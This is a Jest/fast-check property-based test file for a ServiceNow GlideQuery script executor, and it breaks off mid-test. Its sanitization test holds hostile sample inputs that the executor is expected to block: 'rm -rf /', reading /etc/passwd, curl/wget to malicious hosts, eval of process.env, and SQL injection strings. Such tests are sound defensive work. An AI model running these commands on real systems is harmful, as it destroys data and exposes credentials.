import * as fc from 'fast-check';
import { GlideQueryExecutor } from './GlideQueryExecutor.js';
import { ServiceNowClient } from '../client/ServiceNowClient.js';
import { ScriptExecutionResult } from '../types/interfaces.js';

// Mock ServiceNowClient
jest.mock('../client/ServiceNowClient.js');

// Feature: glidequery-development-tools, Property 1: Valid script execution returns results
// **Validates: Requirements 1.1**

describe('GlideQueryExecutor - Property-Based Tests', () => {
  let executor: GlideQueryExecutor;
  let mockClient: jest.Mocked<ServiceNowClient>;

  beforeEach(() => {
    jest.clearAllMocks();
    
    // Create mock client
    mockClient = {
      executeScript: jest.fn()
    } as any;

    executor = new GlideQueryExecutor(mockClient);
  });

  describe('Property 1: Valid script execution returns results', () => {
    it('should return results without errors for any valid GlideQuery script', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate valid GlideQuery scripts
          fc.oneof(
            // Simple count queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              script: fc.constant('count')
            }).map(({ table, script }) => `new GlideQuery('${table}').${script}()`),
            
            // Select queries with where clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field: fc.constantFrom('active', 'state', 'priority', 'urgency', 'impact'),
              value: fc.oneof(
                fc.boolean(),
                fc.integer({ min: 1, max: 5 }),
                fc.string({ minLength: 1, maxLength: 20 })
              )
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`
            ),
            
            // Select with limit
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              limit: fc.integer({ min: 1, max: 100 })
            }).map(({ table, limit }) => 
              `new GlideQuery('${table}').limit(${limit}).select()`
            ),
            
            // SelectOne queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('number', 'sys_id', 'active'),
              value: fc.string({ minLength: 1, maxLength: 32 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`
            ),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => 
              `new GlideQuery('${table}').get('${sysId}')`
            ),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              aggregateType: fc.constantFrom('avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency')
            }).map(({ table, aggregateType, field }) => 
              `new GlideQuery('${table}').${aggregateType}('${field}')`
            ),
            
            // Queries with orderBy
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              orderField: fc.constantFrom('sys_created_on', 'priority', 'number'),
              descending: fc.boolean()
            }).map(({ table, orderField, descending }) => 
              descending 
                ? `new GlideQuery('${table}').orderByDesc('${orderField}').select()`
                : `new GlideQuery('${table}').orderBy('${orderField}').select()`
            ),
            
            // Queries with whereNull/whereNotNull
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('assigned_to', 'resolved_at', 'closed_at'),
              isNull: fc.boolean()
            }).map(({ table, field, isNull }) => 
              isNull
                ? `new GlideQuery('${table}').whereNull('${field}').select()`
                : `new GlideQuery('${table}').whereNotNull('${field}').select()`
            ),
            
            // Queries with multiple where clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field1, value1, field2, value2 }) => 
              `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).select()`
            )
          ),
          async (script) => {
            // Generate appropriate mock response based on script type
            let mockResult: any;
            
            if (script.includes('.count()')) {
              // Count returns a number
              mockResult = fc.sample(fc.integer({ min: 0, max: 1000 }), 1)[0];
            } else if (script.includes('.selectOne()') || script.includes('.get(')) {
              // SelectOne/get returns Optional (single record or null)
              mockResult = fc.sample(
                fc.oneof(
                  fc.record({
                    sys_id: fc.hexaString({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    active: fc.boolean()
                  }),
                  fc.constant(null)
                ),
                1
              )[0];
            } else if (script.includes('.avg(') || script.includes('.sum(') || script.includes('.min(') || script.includes('.max(')) {
              // Aggregates return Optional with numeric value
              mockResult = fc.sample(
                fc.oneof(
                  fc.float({ min: 0, max: 100 }),
                  fc.constant(null)
                ),
                1
              )[0];
            } else if (script.includes('.select()')) {
              // Select returns Stream (array of records)
              mockResult = fc.sample(
                fc.array(
                  fc.record({
                    sys_id: fc.hexaString({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    active: fc.boolean(),
                    priority: fc.integer({ min: 1, max: 5 })
                  }),
                  { minLength: 0, maxLength: 50 }
                ),
                1
              )[0];
            } else {
              // Default: return empty array
              mockResult = [];
            }

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const result = await executor.execute(script);

            // Property: Valid script execution returns results without errors
            // and the response indicates success
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.executionTime).toBeGreaterThanOrEqual(0);
            expect(result.error).toBeUndefined();
            expect(result.data).toBeDefined();
            
            // Verify executeScript was called with the script
            expect(mockClient.executeScript).toHaveBeenCalledWith({
              script,
              timeout: undefined
            });
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  describe('Property 4: Record results are valid JSON', () => {
    it('should return results that are serializable to valid JSON for any script execution that returns records', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate scripts that return record results
          fc.oneof(
            // Select queries returning arrays of records
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              field: fc.constantFrom('active', 'state', 'priority', 'urgency'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => ({
              script: `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`,
              resultType: 'array'
            })),
            
            // Select with specific fields
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              fields: fc.constantFrom(
                ['number', 'short_description'],
                ['sys_id', 'active', 'priority'],
                ['number', 'state', 'assigned_to']
              )
            }).map(({ table, fields }) => ({
              script: `new GlideQuery('${table}').select('${fields.join("', '")}')`,
              resultType: 'array'
            })),
            
            // SelectOne queries returning single record
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'sys_id'),
              value: fc.string({ minLength: 5, maxLength: 32 })
            }).map(({ table, field, value }) => ({
              script: `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`,
              resultType: 'single'
            })),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              sysId: fc.string({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => ({
              script: `new GlideQuery('${table}').get('${sysId}')`,
              resultType: 'single'
            })),
            
            // Insert operations returning record
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              description: fc.string({ minLength: 10, maxLength: 100 })
            }).map(({ table, description }) => ({
              script: `new GlideQuery('${table}').insert({ short_description: '${description}', urgency: 3 })`,
              resultType: 'single'
            })),
            
            // Update operations returning record
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              sysId: fc.string({ minLength: 32, maxLength: 32 }),
              priority: fc.integer({ min: 1, max: 5 })
            }).map(({ table, sysId, priority }) => ({
              script: `new GlideQuery('${table}').where('sys_id', '${sysId}').update({ priority: ${priority} })`,
              resultType: 'single'
            })),
            
            // Queries with display values
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field: fc.constantFrom('assigned_to', 'caller_id', 'opened_by')
            }).map(({ table, field }) => ({
              script: `new GlideQuery('${table}').select('number', '${field}$DISPLAY')`,
              resultType: 'array'
            })),
            
            // Queries with multiple where clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field1, value1, field2, value2 }) => ({
              script: `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).select()`,
              resultType: 'array'
            })),
            
            // Queries with orderBy
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              orderField: fc.constantFrom('sys_created_on', 'priority', 'number'),
              limit: fc.integer({ min: 1, max: 50 })
            }).map(({ table, orderField, limit }) => ({
              script: `new GlideQuery('${table}').orderBy('${orderField}').limit(${limit}).select()`,
              resultType: 'array'
            }))
          ),
          async ({ script, resultType }) => {
            // Generate appropriate mock response based on result type
            let mockResult: any;
            
            if (resultType === 'array') {
              // Generate array of records with various field types
              mockResult = fc.sample(
                fc.array(
                  fc.record({
                    sys_id: fc.string({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    short_description: fc.string({ minLength: 10, maxLength: 100 }),
                    active: fc.boolean(),
                    priority: fc.integer({ min: 1, max: 5 }),
                    state: fc.integer({ min: 1, max: 7 }),
                    urgency: fc.integer({ min: 1, max: 3 }),
                    impact: fc.integer({ min: 1, max: 3 }),
                    sys_created_on: fc.date().map(d => d.toISOString()),
                    assigned_to: fc.oneof(
                      fc.string({ minLength: 32, maxLength: 32 }),
                      fc.constant(null)
                    ),
                    // Include some fields with special characters to test JSON serialization
                    description: fc.string({ minLength: 0, maxLength: 200 }),
                    // Include nested objects
                    caller_id: fc.record({
                      value: fc.string({ minLength: 32, maxLength: 32 }),
                      display_value: fc.string({ minLength: 5, maxLength: 50 })
                    })
                  }),
                  { minLength: 0, maxLength: 20 }
                ),
                1
              )[0];
            } else {
              // Single record or null
              mockResult = fc.sample(
                fc.oneof(
                  fc.record({
                    sys_id: fc.string({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    short_description: fc.string({ minLength: 10, maxLength: 100 }),
                    active: fc.boolean(),
                    priority: fc.integer({ min: 1, max: 5 }),
                    state: fc.integer({ min: 1, max: 7 }),
                    sys_created_on: fc.date().map(d => d.toISOString()),
                    assigned_to: fc.oneof(
                      fc.string({ minLength: 32, maxLength: 32 }),
                      fc.constant(null)
                    ),
                    description: fc.string({ minLength: 0, maxLength: 200 }),
                    caller_id: fc.record({
                      value: fc.string({ minLength: 32, maxLength: 32 }),
                      display_value: fc.string({ minLength: 5, maxLength: 50 })
                    })
                  }),
                  fc.constant(null)
                ),
                1
              )[0];
            }

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const result = await executor.execute(script);

            // Property: For any script execution that returns records, 
            // the results should be serializable to valid JSON format that can be parsed back
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.data).toBeDefined();
            
            // Test JSON serialization
            let serialized: string;
            try {
              serialized = JSON.stringify(result.data);
              expect(serialized).toBeDefined();
              expect(typeof serialized).toBe('string');
            } catch (error) {
              fail(`Failed to serialize result.data to JSON: ${error}`);
            }
            
            // Test JSON deserialization
            let deserialized: any;
            try {
              deserialized = JSON.parse(serialized!);
              expect(deserialized).toBeDefined();
            } catch (error) {
              fail(`Failed to parse serialized JSON: ${error}`);
            }
            
            // Verify the deserialized data matches the original structure
            if (Array.isArray(result.data)) {
              expect(Array.isArray(deserialized)).toBe(true);
              expect(deserialized.length).toBe(result.data.length);
              
              // Verify each record in the array is properly serialized
              for (let i = 0; i < result.data.length; i++) {
                const original = result.data[i];
                const parsed = deserialized[i];
                
                // Check that all fields are preserved
                if (original && typeof original === 'object') {
                  expect(typeof parsed).toBe('object');
                  expect(parsed).not.toBeNull();
                  
                  // Verify key fields are preserved
                  for (const key of Object.keys(original)) {
                    expect(parsed).toHaveProperty(key);
                  }
                }
              }
            } else if (result.data === null) {
              expect(deserialized).toBeNull();
            } else if (typeof result.data === 'object') {
              expect(typeof deserialized).toBe('object');
              expect(deserialized).not.toBeNull();
              
              // Verify key fields are preserved
              for (const key of Object.keys(result.data)) {
                expect(deserialized).toHaveProperty(key);
              }
            }
            
            // Verify the entire ExecutionResult is also JSON serializable
            const fullResultSerialized = JSON.stringify(result);
            expect(fullResultSerialized).toBeDefined();
            
            const fullResultDeserialized = JSON.parse(fullResultSerialized);
            expect(fullResultDeserialized).toBeDefined();
            expect(fullResultDeserialized.success).toBe(result.success);
            expect(fullResultDeserialized.executionTime).toBe(result.executionTime);
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  describe('Property 5: Script input sanitization', () => {
    it('should either sanitize dangerous content or reject scripts with injection patterns with a security error', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate scripts containing various injection patterns
          fc.oneof(
            // Command injection patterns - gs.executeNow (direct call)
            fc.record({
              command: fc.constantFrom(
                'rm -rf /',
                'cat /etc/passwd',
                'curl http://malicious.com',
                'wget http://evil.com/malware'
              )
            }).map(({ command }) => ({
              script: `gs.executeNow('${command}')`,
              injectionType: 'Command Injection (gs.executeNow)',
              dangerous: true,
              detectable: true
            })),
            
            // Code injection patterns - gs.eval (direct call)
            fc.record({
              code: fc.constantFrom(
                'gs.print("malicious code")',
                'new GlideRecord("sys_user").deleteMultiple()',
                'gs.setProperty("glide.system.status", "down")'
              )
            }).map(({ code }) => ({
              script: `gs.eval('${code}')`,
              injectionType: 'Code Injection (gs.eval)',
              dangerous: true,
              detectable: true
            })),
            
            // Direct eval usage
            fc.record({
              code: fc.constantFrom(
                'alert("xss")',
                'console.log(process.env)',
                'require("fs").readFileSync("/etc/passwd")'
              )
            }).map(({ code }) => ({
              script: `eval('${code}')`,
              injectionType: 'Code Injection (eval)',
              dangerous: true,
              detectable: true
            })),
            
            // Function constructor injection
            fc.record({
              code: fc.constantFrom(
                'return process.env',
                'return require("fs")',
                'gs.print("injected")'
              )
            }).map(({ code }) => ({
              script: `new Function('${code}')()`,
              injectionType: 'Code Injection (Function constructor)',
              dangerous: true,
              detectable: true
            })),
            
            // GlideRecord usage (discouraged in favor of GlideQuery)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'sys_user'),
              operation: fc.constantFrom('query', 'deleteMultiple', 'updateMultiple')
            }).map(({ table, operation }) => ({
              script: `var gr = new GlideRecord('${table}'); gr.${operation}();`,
              injectionType: 'GlideRecord Usage',
              dangerous: true,
              detectable: true
            })),
            
            // Mixed dangerous patterns
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              dangerousCode: fc.constantFrom(
                'gs.executeNow("ls -la")',
                'eval("malicious")',
                'gs.eval("code")'
              )
            }).map(({ table, dangerousCode }) => ({
              script: `new GlideQuery('${table}').select(); ${dangerousCode};`,
              injectionType: 'Mixed Injection',
              dangerous: true,
              detectable: true
            })),
            
            // Case variations to test pattern matching (case-insensitive regex)
            fc.record({
              caseVariation: fc.constantFrom(
                'gs.ExecuteNow',
                'gs.EXECUTENOW',
                'GS.executeNow',
                'gs.Eval',
                'EVAL'
              )
            }).map(({ caseVariation }) => ({
              script: `${caseVariation}('test')`,
              injectionType: 'Case Variation Injection',
              dangerous: true,
              detectable: true
            })),
            
            // Whitespace variations (regex handles \s*)
            fc.record({
              spaces: fc.constantFrom('', ' ', '  ', '\t')
            }).map(({ spaces }) => ({
              script: `gs.executeNow${spaces}('malicious')`,
              injectionType: 'Whitespace Variation Injection',
              dangerous: true,
              detectable: true
            })),
            
            // SQL injection patterns in GlideQuery (should be safe due to parameterization)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'short_description', 'description'),
              sqlInjection: fc.constantFrom(
                "'; DROP TABLE incident; --",
                "' OR '1'='1",
                "'; DELETE FROM sys_user WHERE '1'='1",
                "' UNION SELECT * FROM sys_user --"
              )
            }).map(({ table, field, sqlInjection }) => ({
              script: `new GlideQuery('${table}').where('${field}', '${sqlInjection}').select()`,
              injectionType: 'SQL Injection (parameterized - safe)',
              dangerous: false,
              detectable: false
            }))
          ),
          async ({ script, injectionType, dangerous, detectable }) => {
            // Clear mock before each test iteration
            mockClient.executeScript.mockClear();
            
            const result = await executor.execute(script);

            // Property: For any script containing injection patterns,
            // the Script_Executor should either sanitize the dangerous content
            // or reject the script with a security error
            
            if (dangerous && detectable) {
              // Dangerous and detectable scripts should be rejected with security error
              expect(result).toBeDefined();
              expect(result.success).toBe(false);
              expect(result.error).toBeDefined();
              expect(typeof result.error).toBe('string');
              expect(result.error).toMatch(/security|violation|blacklist/i);
              
              // Verify the script was NOT executed
              expect(mockClient.executeScript).not.toHaveBeenCalled();
              
              // Execution time should be minimal (no actual execution)
              expect(result.executionTime).toBeLessThan(100);
            } else if (!dangerous) {
              // Non-dangerous scripts (like parameterized queries) can proceed
              // Mock successful execution
              mockClient.executeScript.mockResolvedValue({
                success: true,
                result: [],
                executionTime: 50
              });
              
              const safeResult = await executor.execute(script);
              expect(safeResult).toBeDefined();
              
              // These should not be blocked
              if (!safeResult.success) {
                // If rejected, should not be for security reasons
                expect(safeResult.error).not.toMatch(/security|violation|blacklist/i);
              }
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should allow safe GlideQuery scripts without false positives', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate safe GlideQuery scripts that should NOT be blocked
          fc.oneof(
            // Normal queries with user input (properly parameterized)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'short_description', 'state'),
              value: fc.string({ minLength: 1, maxLength: 50 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', '${value}').select()`
            ),
            
            // Queries with special characters in values (should be safe due to parameterization)
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field: fc.constantFrom('short_description', 'description'),
              specialValue: fc.constantFrom(
                "O'Brien's ticket",
                'Test & Development',
                'Price: $100',
                'Email: user@example.com',
                'Path: C:\\Windows\\System32'
              )
            }).map(({ table, field, specialValue }) => 
              `new GlideQuery('${table}').where('${field}', '${specialValue}').select()`
            ),
            
            // Complex but safe queries
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field1, value1, field2, value2 }) => 
              `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).orderBy('sys_created_on').limit(10).select()`
            ),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              aggregateType: fc.constantFrom('count', 'avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency')
            }).map(({ table, aggregateType, field }) => 
              aggregateType === 'count'
                ? `new GlideQuery('${table}').count()`
                : `new GlideQuery('${table}').${aggregateType}('${field}')`
            ),
            
            // Write operations (safe when using GlideQuery)
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              description: fc.string({ minLength: 10, maxLength: 100 })
            }).map(({ table, description }) => 
              `new GlideQuery('${table}').insert({ short_description: '${description}', urgency: 3 })`
            ),
            
            // Queries with null checks
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field: fc.constantFrom('assigned_to', 'resolved_at', 'closed_at')
            }).map(({ table, field }) => 
              `new GlideQuery('${table}').whereNull('${field}').select()`
            )
          ),
          async (script) => {
            // Clear mock before each test iteration
            mockClient.executeScript.mockClear();
            
            // Mock successful execution for safe scripts
            const mockResponse = {
              success: true,
              result: [],
              executionTime: 50
            };
            
            mockClient.executeScript.mockResolvedValue(mockResponse);

            const result = await executor.execute(script);

            // Property: Safe scripts should not be blocked by sanitization
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.error).toBeUndefined();
            
            // Verify the script was executed (not blocked)
            expect(mockClient.executeScript).toHaveBeenCalled();
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  describe('Property 2: Failed execution includes error details', () => {
    it('should return error details for any GlideQuery script that fails execution', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate scripts that will fail with various error types
          fc.oneof(
            // Syntax errors - invalid method names
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              invalidMethod: fc.constantFrom('selectAll', 'findOne', 'queryAll', 'getAll', 'fetch')
            }).map(({ table, invalidMethod }) => ({
              script: `new GlideQuery('${table}').${invalidMethod}()`,
              errorType: 'TypeError',
              errorMessage: `${invalidMethod} is not a function`
            })),
            
            // Runtime errors - undefined variables
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              undefinedVar: fc.string({ minLength: 5, maxLength: 15 }).filter(s => /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(s))
            }).map(({ table, undefinedVar }) => ({
              script: `new GlideQuery('${table}').where('field', ${undefinedVar}).select()`,
              errorType: 'ReferenceError',
              errorMessage: `${undefinedVar} is not defined`
            })),
            
            // Invalid operator errors
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field: fc.constantFrom('active', 'priority', 'state'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OPERATOR', 'WRONG_OP')
            }).map(({ table, field, invalidOperator }) => ({
              script: `new GlideQuery('${table}').where('${field}', '${invalidOperator}', 1).select()`,
              errorType: 'Error',
              errorMessage: `Invalid operator: ${invalidOperator}`
            })),
            
            // Chaining errors - calling terminal operation twice
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task')
            }).map(({ table }) => ({
              script: `new GlideQuery('${table}').select().count()`,
              errorType: 'TypeError',
              errorMessage: 'count is not a function'
            })),
            
            // Null reference errors
            fc.record({
              table: fc.constantFrom('incident', 'problem')
            }).map(({ table }) => ({
              script: `var result = null; result.where('field', 'value')`,
              errorType: 'TypeError',
              errorMessage: "Cannot read property 'where' of null"
            })),
            
            // Missing parentheses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request')
            }).map(({ table }) => ({
              script: `new GlideQuery('${table}').select`,
              errorType: 'SyntaxError',
              errorMessage: 'Unexpected end of input'
            })),
            
            // Invalid field flags
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field: fc.constantFrom('assigned_to', 'caller_id'),
              invalidFlag: fc.constantFrom('INVALID', 'BAD_FLAG', 'WRONG')
            }).map(({ table, field, invalidFlag }) => ({
              script: `new GlideQuery('${table}').select('${field}$${invalidFlag}')`,
              errorType: 'Error',
              errorMessage: `Invalid field flag: ${invalidFlag}`
            })),
            
            // Incorrect aggregate usage
            fc.record({
              table: fc.constantFrom('incident', 'problem')
            }).map(({ table }) => ({
              script: `new GlideQuery('${table}').count().avg('priority')`,
              errorType: 'TypeError',
              errorMessage: 'avg is not a function'
            }))
          ),
          async ({ script, errorType, errorMessage }) => {
            // Generate line number (1-10 for simplicity)
            const lineNumber = fc.sample(fc.integer({ min: 1, max: 10 }), 1)[0];
            
            const mockResponse: ScriptExecutionResult = {
              success: false,
              error: {
                message: errorMessage,
                type: errorType,
                line: lineNumber
              },
              executionTime: fc.sample(fc.integer({ min: 5, max: 100 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            const result = await executor.execute(script);

            // Property: Failed execution includes error details
            // The error response should contain a descriptive message, error type, and line number
            expect(result).toBeDefined();
            expect(result.success).toBe(false);
            expect(result.error).toBeDefined();
            expect(typeof result.error).toBe('string');
            expect(result.error).toBe(errorMessage);
            expect(result.executionTime).toBeGreaterThanOrEqual(0);
            
            // Verify executeScript was called
            expect(mockClient.executeScript).toHaveBeenCalledWith({
              script,
              timeout: undefined
            });
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 15: Test mode execution returns results
  // Feature: glidequery-development-tools, Property 16: Test mode result limiting
  // **Validates: Requirements 4.1, 4.2**
  describe('Property 15 & 16: Test mode execution and result limiting', () => {
    it('should return results for any GlideQuery snippet executed in test mode', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate various GlideQuery scripts for test mode
          fc.oneof(
            // Select queries that return arrays
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              field: fc.constantFrom('active', 'state', 'priority', 'urgency'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => ({
              script: `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`,
              returnsArray: true
            })),
            
            // Select with multiple conditions
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field1, value1, field2, value2 }) => ({
              script: `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).select()`,
              returnsArray: true
            })),
            
            // Select with orderBy
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              orderField: fc.constantFrom('sys_created_on', 'priority', 'number'),
              descending: fc.boolean()
            }).map(({ table, orderField, descending }) => ({
              script: descending 
                ? `new GlideQuery('${table}').orderByDesc('${orderField}').select()`
                : `new GlideQuery('${table}').orderBy('${orderField}').select()`,
              returnsArray: true
            })),
            
            // Select with whereNull/whereNotNull
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('assigned_to', 'resolved_at', 'closed_at'),
              isNull: fc.boolean()
            }).map(({ table, field, isNull }) => ({
              script: isNull
                ? `new GlideQuery('${table}').whereNull('${field}').select()`
                : `new GlideQuery('${table}').whereNotNull('${field}').select()`,
              returnsArray: true
            })),
            
            // SelectOne queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'sys_id'),
              value: fc.string({ minLength: 5, maxLength: 32 })
            }).map(({ table, field, value }) => ({
              script: `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`,
              returnsArray: false
            })),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => ({
              script: `new GlideQuery('${table}').get('${sysId}')`,
              returnsArray: false
            })),
            
            // Count queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task')
            }).map(({ table }) => ({
              script: `new GlideQuery('${table}').count()`,
              returnsArray: false
            })),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              aggregateType: fc.constantFrom('avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency')
            }).map(({ table, aggregateType, field }) => ({
              script: `new GlideQuery('${table}').${aggregateType}('${field}')`,
              returnsArray: false
            }))
          ),
          async ({ script, returnsArray }) => {
            // Generate mock result based on script type
            let mockResult: any;
            
            if (returnsArray) {
              // Generate array of records
              const recordCount = fc.sample(fc.integer({ min: 0, max: 200 }), 1)[0];
              const records = Array.from({ length: recordCount }, (_, i) => ({
                sys_id: fc.sample(fc.hexaString({ minLength: 32, maxLength: 32 }), 1)[0],
                number: `INC${String(i).padStart(7, '0')}`,
                active: fc.sample(fc.boolean(), 1)[0],
                priority: fc.sample(fc.integer({ min: 1, max: 5 }), 1)[0],
                state: fc.sample(fc.integer({ min: 1, max: 7 }), 1)[0]
              }));
              
              // Test mode wrapping should limit to 100 records
              if (recordCount > 100) {
                mockResult = {
                  __testMode: true,
                  __truncated: true,
                  __originalCount: recordCount,
                  data: records.slice(0, 100)
                };
              } else {
                mockResult = {
                  __testMode: true,
                  __truncated: false,
                  data: records
                };
              }
            } else {
              // Non-array results (single record, count, aggregate)
              mockResult = fc.sample(
                fc.oneof(
                  fc.record({
                    sys_id: fc.hexaString({ minLength: 32, maxLength: 32 }),
                    number: fc.string({ minLength: 5, maxLength: 20 }),
                    active: fc.boolean()
                  }),
                  fc.integer({ min: 0, max: 1000 }),
                  fc.float({ min: 0, max: 100 }),
                  fc.constant(null)
                ),
                1
              )[0];
            }

            const mockResponse: ScriptExecutionResult = {
              success: true,
              result: mockResult,
              executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
            };

            mockClient.executeScript.mockResolvedValue(mockResponse);

            // Execute in test mode
            const result = await executor.execute(script, { testMode: true });

            // Property 15: Test mode execution returns results
            // For any GlideQuery snippet executed in test mode, 
            // the Script_Executor should return results (or errors) just like normal execution
            expect(result).toBeDefined();
            expect(result.success).toBe(true);
            expect(result.executionTime).toBeGreaterThanOrEqual(0);
            expect(result.error).toBeUndefined();
            expect(result.data).toBeDefined();
            
            // Property 16: Test mode result limiting
            // For any query executed in test mode that would return more than 100 records,
            // the results should be limited to exactly 100 records and the truncated flag should be true
            if (returnsArray && mockResult.__testMode) {
              if (mockResult.__truncated) {
                // Results were truncated
                expect(result.truncated).toBe(true);
                expect(Array.isArray(result.data)).toBe(true);
                expect(result.data.length).toBeLessThanOrEqual(100);
                expect(result.recordCount).toBeLessThanOrEqual(100);
                
                // Verify truncation message in logs
                expect(result.logs).toBeDefined();
                expect(result.logs?.some(log => log.includes('truncated'))).toBe(true);
              } else {
                // Results were not truncated (less than or equal to 100)
                expect(result.truncated).toBe(false);
                expect(Array.isArray(result.data)).toBe(true);
                expect(result.data.length).toBeLessThanOrEqual(100);
              }
            }
            
            // Verify executeScript was called with wrapped script
